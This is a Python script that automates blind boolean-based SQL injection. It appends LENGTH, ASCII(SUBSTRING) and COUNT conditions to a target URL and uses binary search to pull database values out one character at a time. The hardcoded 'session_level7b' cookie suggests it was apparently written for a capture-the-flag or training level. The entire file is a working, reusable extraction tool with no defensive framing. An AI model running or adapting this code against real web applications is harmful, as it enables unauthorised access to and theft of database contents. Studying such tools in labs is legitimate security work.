import requests

from imports.sys_helpers import *

cookies = dict(session_level7b='eyJ1c2VyIjoidGVzdCJ9.XOLGJw.A-Y_mQZH8YuKh2VYBDwTj2hcQ_U')

req_count = 0

def is_success(response):
	if 'NoneType' not in response.content:
	#if rs.status_code == success_code:
		return True
	return False 

def get_length(payload,base_url,success_code):
	answer_len = 1
	write_val("Length: %i" % answer_len)
	while True:
		url = base_url + " AND LENGTH((%s)) = %i" % (payload,answer_len)
		rs = requests.get(url, cookies=cookies)
		
		if is_success(rs):
			erase_value("Length: %i" % answer_len)
			return answer_len

		overwrite(answer_len,answer_len+1)
		answer_len += 1

def search_value(payload,base_url,pos,search_range=[1,255]):
	intermediate = (search_range[0] + search_range[1])/2
	
	url = base_url + " AND ASCII(SUBSTRING((%s),%i,1)) <= %i" % (payload,pos,intermediate)
	rs = requests.get(url, cookies=cookies)
	global req_count 
	req_count +=1

	if search_range[1] - search_range[0] < 2:
		rs2 = requests.get(base_url + " AND ASCII(SUBSTRING((%s),%i,1)) = %i" % (payload,pos,search_range[0]), cookies=cookies)
		req_count +=1
		if is_success(rs2):
			return search_range[0]
		rs3 = requests.get(base_url + " AND ASCII(SUBSTRING((%s),%i,1)) = %i" % (payload,pos,search_range[1]), cookies=cookies)
		req_count +=1
		if is_success(rs3):
			return search_range[1]

	if is_success(rs):
		search_range = [search_range[0],intermediate]
	else:
		search_range = [intermediate,search_range[1]]

	return search_value(payload,base_url,pos,search_range) 

def get_value(payload,length,known_start,base_url,success_code):
	result = ""
	if known_start != None:
		result = known_start

	write_val("Value: %s" % result)
	for pos in range(len(result)+1,length+1):
		char_code = search_value(payload,base_url,pos)
		write_val(chr(char_code))
		result += chr(char_code)
	erase_value("Value: %s" % result)
	global req_count
	print req_count
	req_count = 0
	return result

def get_count(payload, base_url, success_code):
	answer_len = 1
	write_val("Count: %i" % answer_len)
	while True:
		url = base_url + " AND (select COUNT(*) from (%s) as T2) = %i" % (payload,answer_len)
		rs = requests.get(url, cookies=cookies)
		
		if is_success(rs):
			erase_value("Count: %i" % answer_len)
			return answer_len

		overwrite(answer_len,answer_len+1)
		answer_len += 1

def get_values(payload, base_url, success_code):
	payload = payload
	value_count = get_count(payload, base_url, success_code)
	for limit in range(1,value_count):
		length = get_length("%s limit %i,1" % (payload,limit), base_url, success_code)
		yield get_value("%s limit %i,1" % (payload,limit), length, None, base_url, success_code)